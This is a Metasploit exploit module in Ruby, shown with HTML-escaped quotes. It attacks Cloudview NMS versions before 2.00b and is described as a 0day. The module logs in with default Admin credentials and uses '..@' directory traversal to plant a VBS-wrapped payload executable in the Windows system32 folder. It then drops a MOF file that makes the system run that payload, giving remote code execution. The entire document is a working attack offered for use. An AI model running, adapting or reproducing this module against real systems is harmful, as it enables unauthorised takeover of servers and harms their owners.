 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
    include Msf::Exploit::WbemExec
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Cloudview NMS File Upload&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a file upload vulnerability
                found within Cloudview NMS < 2.00b. The vulnerability
                is triggered by sending specialized packets to the
                server with directory traversal sequences (..@ in
                this case) to browse outside of the web root.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;0day&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Cloudview NMS 2.00b on Windows&#039;, {} ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 13 2014&#039;))
 
        register_options([
            Opt::RPORT(80),
            OptString.new(&#039;USERNAME&#039;, [ true, "The username to log in with", "Admin" ]),
            OptString.new(&#039;PASSWORD&#039;, [ false, "The password to log in with", "" ])
        ], self.class )
    end
 
    def exploit
 
        # setup
        vbs_name    = rand_text_alpha(rand(10)+5) + &#039;.vbs&#039;
        exe         = generate_payload_exe
        vbs_content = Msf::Util::EXE.to_exe_vbs(exe)
        mof_name    = rand_text_alpha(rand(10)+5) + &#039;.vbs&#039;
        mof         = generate_mof(mof_name, vbs_name)
        peer        = "#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}"
 
        print_status("Uploading #{vbs_name} to #{peer}...")
 
        # logging in to get the "session"
        @sess = rand(0..2048)
        res = send_request_cgi({
            &#039;method&#039;    =>   &#039;POST&#039;,
            &#039;uri&#039;       =>   "/MPR=#{@sess}:/",
            &#039;version&#039;   =>   &#039;1.1&#039;,
            &#039;ctype&#039;     =>   &#039;application/x-www-form-urlencoded&#039;,
            &#039;data&#039;      =>   "username=#{datastore[&#039;USERNAME&#039;]}&password=#{datastore[&#039;PASSWORD&#039;]}&mybutton=Login%21&donotusejava=html"
        })
 
        # This is needed to setup the upload directory
        res = send_request_cgi({
            &#039;method&#039;    => &#039;GET&#039;,
            &#039;uri&#039;       => "/MPR=#{@sess}:/descriptor!ChangeDir=C:@..@..@..@WINDOWS@system32@!-!-!@extdir%5Cfilelistpage!-!1000",
            &#039;version&#039;   => &#039;1.1&#039;,
        })
 
        # Uploading VBS file
        data = Rex::MIME::Message.new
        data.add_part("#{vbs_content}", "application/octet-stream", nil, "form-data; name=\"upfile\"; filename=\"#{vbs_name}\"")
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")
 
        res = send_request_cgi({
            &#039;method&#039;    =>   &#039;POST&#039;,
            &#039;uri&#039;       =>   "/MPR=#{@sess}:/",
            &#039;version&#039;   =>   &#039;1.1&#039;,
            &#039;ctype&#039;     =>   "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;      =>   post_data
        })
 
        if res.body =~ /Uploaded file OK/
            print_good("Uploaded #{vbs_name} successfully!")
            print_status("Uploading #{mof_name} to #{peer}...")
 
            # Setting up upload directory
            res = send_request_cgi({
                &#039;method&#039;    =>   &#039;GET&#039;,
                &#039;uri&#039;       =>   "/MPR=#{@sess}:/descriptor!ChangeDir=C:@..@..@..@WINDOWS@system32@wbem@mof@!-!-!@extdir%5Cfilelistpage!-!1000",
                &#039;version&#039;   =>   &#039;1.1&#039;
            })
 
            # Uploading MOF file
            data = Rex::MIME::Message.new
            data.add_part("#{mof}", "application/octet-stream", nil, "form-data; name=\"upfile\"; filename=\"#{mof_name}\"")
            post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, "--_Part_")
 
            res = send_request_cgi({
                &#039;method&#039;    =>   &#039;POST&#039;,
                &#039;uri&#039;       =>   "/MPR=#{@sess}:/",
                &#039;version&#039;   =>   &#039;1.1&#039;,
                &#039;ctype&#039;     =>   "multipart/form-data; boundary=#{data.bound}",
                &#039;data&#039;      =>   post_data
            })
 
            if res.body =~ /Uploaded file OK/
                print_good("Uploaded #{mof_name} successfully!")
            else
                print_error("Something went wrong...")
            end
        else
            print_error("Something went wrong...")
        end
 
    end
 
end

